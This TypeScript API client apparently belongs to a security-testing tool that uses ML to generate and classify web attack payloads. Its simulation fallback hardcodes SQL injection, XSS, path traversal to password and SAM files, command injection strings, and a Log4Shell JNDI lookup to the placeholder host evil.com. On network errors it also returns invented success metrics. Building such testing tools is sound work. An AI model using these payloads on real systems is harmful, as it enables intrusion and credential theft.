
import axios from 'axios';

// Create ML-specific API instance
const mlApi = axios.create({
  baseURL: 'http://localhost:5000/api/ml',
  timeout: 60000, // Longer timeout for ML operations
  headers: {
    'Content-Type': 'application/json',
  },
});

// Simulation mode flag
let SIMULATION_MODE = false;

// Add request/response interceptors
mlApi.interceptors.request.use(
  (config) => {
    console.log(`ML API Request: ${config.method?.toUpperCase()} ${config.url}`);
    return config;
  },
  (error) => {
    console.error('ML API Request Error:', error);
    return Promise.reject(error);
  }
);

mlApi.interceptors.response.use(
  (response) => {
    console.log(`ML API Response: ${response.config.url} - Status: ${response.status}`);
    return response;
  },
  (error) => {
    console.error(`ML API Error: ${error.config?.url} - ${error.message}`);
    // Enable simulation mode if backend is not available
    if (error.code === 'ERR_NETWORK' || error.code === 'ECONNREFUSED') {
      console.warn('🔄 Backend not available - switching to simulation mode');
      SIMULATION_MODE = true;
    }
    return Promise.reject(error);
  }
);

export interface MLAnalysisResult {
  status: 'success' | 'error';
  message: string;
  payloads?: string[];
  patterns?: string[];
  model_performance?: {
    accuracy: number;
    precision: number;
    recall: number;
    f1_score: number;
  };
  anomaly_detection_rate?: number;
  generated_payloads_count?: number;
  exploitdb_payloads_count?: number;
  timestamp?: string;
}

export interface PayloadGenerationResult {
  status: 'success' | 'error';
  message: string;
  payloads: string[];
  count: number;
  context?: string;
}

export interface DatasetAnalysisResult {
  status: 'success' | 'error';
  message: string;
  patterns: Record<string, number>;
  class_distribution: Record<string, number>;
  total_samples: number;
  successful_payloads: number;
}

// Simulation functions
const simulateMLAnalysis = (): Promise<MLAnalysisResult> => {
  return new Promise((resolve) => {
    setTimeout(() => {
      const payloads = [
        "' OR 1=1 --",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "| ls -la",
        "${jndi:ldap://evil.com/x}"
      ];
      
      resolve({
        status: 'success',
        message: 'ML analysis completed (simulated)',
        payloads,
        patterns: ['sql_injection', 'xss', 'path_traversal'],
        model_performance: {
          accuracy: 0.87,
          precision: 0.85,
          recall: 0.89,
          f1_score: 0.87
        },
        anomaly_detection_rate: 0.25,
        generated_payloads_count: payloads.length,
        timestamp: new Date().toISOString()
      });
    }, 2000);
  });
};

const simulateTraining = (dataset?: any[]): Promise<any> => {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({
        success: true,
        accuracy: 0.89,
        dataset_size: dataset?.length || 100,
        last_trained: new Date().toISOString(),
        classification_report: {
          'safe': { precision: 0.91, recall: 0.88, 'f1-score': 0.89 },
          'malicious': { precision: 0.87, recall: 0.90, 'f1-score': 0.88 }
        },
        confusion_matrix: [[45, 5], [3, 47]],
        class_distribution: { safe: 50, malicious: 50 }
      });
    }, 3000);
  });
};

const simulatePayloadGeneration = (context?: string, numSamples: number = 5): Promise<PayloadGenerationResult> => {
  return new Promise((resolve) => {
    setTimeout(() => {
      const payloadTemplates: Record<string, string[]> = {
        'sql_injection': [
          "' OR 1=1 --",
          "'; DROP TABLE users; --",
          "' UNION SELECT username, password FROM users --"
        ],
        'xss': [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert(1)>",
          "javascript:alert(document.cookie)"
        ],
        'path_traversal': [
          "../../etc/passwd",
          "../../../windows/system32/config/sam",
          "....//....//etc/shadow"
        ],
        'command_injection': [
          "| ls -la",
          "; cat /etc/passwd",
          "` whoami `"
        ]
      };

      const contextKey = context?.toLowerCase().replace(' ', '_') || 'sql_injection';
      const templates = payloadTemplates[contextKey] || payloadTemplates['sql_injection'];
      const selectedPayloads = templates.slice(0, numSamples);

      resolve({
        status: 'success',
        message: `Generated ${selectedPayloads.length} payloads (simulated)`,
        payloads: selectedPayloads,
        count: selectedPayloads.length,
        context
      });
    }, 1000);
  });
};

// ML API Functions with fallback simulation
export const mlApiService = {
  // Run complete ML analysis pipeline
  async runAnalysis(): Promise<MLAnalysisResult> {
    if (SIMULATION_MODE) {
      console.log('🎭 Running ML analysis in simulation mode...');
      return simulateMLAnalysis();
    }

    try {
      console.log('🧠 Starting ML analysis pipeline...');
      const response = await mlApi.post('/analyze');
      return response.data;
    } catch (error: any) {
      console.error('Error running ML analysis:', error);
      if (error.code === 'ERR_NETWORK') {
        console.log('🎭 Falling back to simulation mode...');
        SIMULATION_MODE = true;
        return simulateMLAnalysis();
      }
      throw new Error(`ML analysis failed: ${error.message}`);
    }
  },

  // Train ML models
  async trainModels(dataset?: any[]): Promise<MLAnalysisResult> {
    if (SIMULATION_MODE) {
      console.log('🎭 Training models in simulation mode...');
      const result = await simulateTraining(dataset);
      return {
        status: 'success',
        message: 'Model training completed (simulated)',
        model_performance: {
          accuracy: result.accuracy,
          precision: 0.87,
          recall: 0.89,
          f1_score: 0.88
        }
      };
    }

    try {
      console.log('🎯 Training ML models...');
      const response = await mlApi.post('/train', { dataset });
      return response.data;
    } catch (error: any) {
      console.error('Error training models:', error);
      if (error.code === 'ERR_NETWORK') {
        console.log('🎭 Falling back to simulation mode...');
        SIMULATION_MODE = true;
        const result = await simulateTraining(dataset);
        return {
          status: 'success',
          message: 'Model training completed (simulated)',
          model_performance: {
            accuracy: result.accuracy,
            precision: 0.87,
            recall: 0.89,
            f1_score: 0.88
          }
        };
      }
      throw new Error(`Model training failed: ${error.message}`);
    }
  },

  // Train classifier (backward compatibility)
  async trainClassifier(dataset?: any[]): Promise<any> {
    if (SIMULATION_MODE) {
      console.log('🎭 Training classifier in simulation mode...');
      return simulateTraining(dataset);
    }

    try {
      console.log('🎯 Training classifier model...');
      const response = await mlApi.post('/train-classifier', { dataset });
      return response.data;
    } catch (error: any) {
      console.error('Error training classifier:', error);
      if (error.code === 'ERR_NETWORK') {
        console.log('🎭 Falling back to simulation mode...');
        SIMULATION_MODE = true;
        return simulateTraining(dataset);
      }
      throw new Error(`Classifier training failed: ${error.message}`);
    }
  },

  // Generate payloads using ML
  async generatePayloads(context?: string, numSamples: number = 5): Promise<PayloadGenerationResult> {
    if (SIMULATION_MODE) {
      console.log('🎭 Generating payloads in simulation mode...');
      return simulatePayloadGeneration(context, numSamples);
    }

    try {
      console.log(`🚀 Generating ${numSamples} ML payloads for context: ${context || 'general'}`);
      const response = await mlApi.post('/generate-payloads', {
        context,
        num_samples: numSamples
      });
      return response.data;
    } catch (error: any) {
      console.error('Error generating payloads:', error);
      if (error.code === 'ERR_NETWORK') {
        console.log('🎭 Falling back to simulation mode...');
        SIMULATION_MODE = true;
        return simulatePayloadGeneration(context, numSamples);
      }
      throw new Error(`Payload generation failed: ${error.message}`);
    }
  },

  // Analyze dataset patterns
  async analyzeDataset(dataset: any[]): Promise<DatasetAnalysisResult> {
    if (SIMULATION_MODE) {
      console.log('🎭 Analyzing dataset in simulation mode...');
      return {
        status: 'success',
        message: 'Dataset analysis completed (simulated)',
        patterns: { sql_injection: 0.4, xss: 0.3, path_traversal: 0.3 },
        class_distribution: { safe: 60, malicious: 40 },
        total_samples: dataset.length,
        successful_payloads: Math.floor(dataset.length * 0.4)
      };
    }

    try {
      console.log('📊 Analyzing dataset patterns...');
      const response = await mlApi.post('/analyze-dataset', { dataset });
      return response.data;
    } catch (error: any) {
      console.error('Error analyzing dataset:', error);
      if (error.code === 'ERR_NETWORK') {
        console.log('🎭 Falling back to simulation mode...');
        SIMULATION_MODE = true;
        return {
          status: 'success',
          message: 'Dataset analysis completed (simulated)',
          patterns: { sql_injection: 0.4, xss: 0.3, path_traversal: 0.3 },
          class_distribution: { safe: 60, malicious: 40 },
          total_samples: dataset.length,
          successful_payloads: Math.floor(dataset.length * 0.4)
        };
      }
      throw new Error(`Dataset analysis failed: ${error.message}`);
    }
  },

  // Get model status
  async getModelStatus(): Promise<any> {
    if (SIMULATION_MODE) {
      return {
        status: 'ready',
        models_loaded: true,
        last_trained: new Date().toISOString(),
        mode: 'simulation'
      };
    }

    try {
      const response = await mlApi.get('/status');
      return response.data;
    } catch (error: any) {
      console.error('Error getting model status:', error);
      if (error.code === 'ERR_NETWORK') {
        SIMULATION_MODE = true;
        return {
          status: 'ready',
          models_loaded: true,
          last_trained: new Date().toISOString(),
          mode: 'simulation'
        };
      }
      throw new Error(`Model status check failed: ${error.message}`);
    }
  },

  // Save generated payloads
  async savePayloads(payloads: string[]): Promise<any> {
    if (SIMULATION_MODE) {
      console.log(`💾 Saving ${payloads.length} payloads (simulated)...`);
      return {
        status: 'success',
        message: `Saved ${payloads.length} payloads (simulated)`,
        saved_count: payloads.length
      };
    }

    try {
      console.log(`💾 Saving ${payloads.length} payloads...`);
      const response = await mlApi.post('/save-payloads', { payloads });
      return response.data;
    } catch (error: any) {
      console.error('Error saving payloads:', error);
      if (error.code === 'ERR_NETWORK') {
        SIMULATION_MODE = true;
        return {
          status: 'success',
          message: `Saved ${payloads.length} payloads (simulated)`,
          saved_count: payloads.length
        };
      }
      throw new Error(`Payload saving failed: ${error.message}`);
    }
  }
};

export default mlApiService;
